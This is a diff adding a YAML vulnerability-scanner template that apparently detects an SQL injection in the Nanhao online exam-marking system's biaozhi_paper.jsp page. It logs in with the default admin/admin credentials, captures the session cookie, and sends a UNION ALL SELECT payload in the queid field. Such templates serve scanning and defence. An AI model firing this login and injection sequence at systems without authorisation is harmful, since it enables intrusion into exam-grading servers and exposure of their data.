@@ -1,0 +1,52 @@
+id: nanhao-oms-biaozhi-paper-sqli
+info:
+  name: 南昊网上阅卷系统 biaozhi_paper.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    南昊网上阅卷系统 biaozhi_paper.jsp 页面存在SQL注入漏洞，攻击者可通过构造恶意语句获取敏感信息。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: login-request
+    method: POST
+    path:
+      - "/exam/login_ok.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "logname=admin&logpass=admin"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '登录成功')"
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        group: 1
+        regex:
+          - "JSESSIONID=(.*?);"
+
+  - id: sqli-test
+    method: POST
+    path:
+      - "/exam/admin/chaxun/biaozhi_paper.jsp?paper_id=100004&&actionid=1"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "JSESSIONID={{session_cookie}}"
+    body: "queid=')+UNION+ALL+SELECT+1,CONCAT(0x7e,md5({{t1}}),0x7e)#&teaid=&typeid=&Submit32=%CB%D1%CB%F7"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, '标志类型')"
+          - "contains(body, '科目名称')"
+          - "contains(body, t2)"
